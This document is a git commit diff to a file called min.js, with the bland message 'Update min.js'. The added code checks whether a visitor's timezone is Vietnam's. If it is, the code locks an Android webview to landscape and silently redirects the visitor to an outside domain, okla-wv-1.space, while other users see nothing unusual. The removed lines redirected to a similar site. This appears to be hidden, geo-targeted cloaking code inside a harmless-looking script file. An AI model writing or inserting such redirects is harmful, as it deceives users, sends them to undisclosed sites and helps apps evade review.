346b54dbb5ffef54edfbb3ef9dcad13b515d015c
hai07t <hai07t@gmail.com>
2025-09-22 17:16:37 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,6 +1,17 @@
-const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-console.log(userTimeZone);
+var conf = (window.__OKBAY_CONF__) || {};
+var utm_source = conf.utm_source || 'okbay';
+var utm_campaign = conf.utm_campaign || 'okbay';
 
-if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-  window.location.href = "https://play.sao789a.to/";
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
+  if (window.AndroidOrientation && AndroidOrientation.lockLandscape) {
+    AndroidOrientation.lockLandscape();
+  }
+  var to = 'https://okla-wv-1.space/?utm_source=okbay&utm_campaign=okbay';
+  window.location.href = to;
+} else {
+  if (window.AndroidOrientation && AndroidOrientation.lockPortrait) {
+    AndroidOrientation.lockPortrait();
+  }
 }
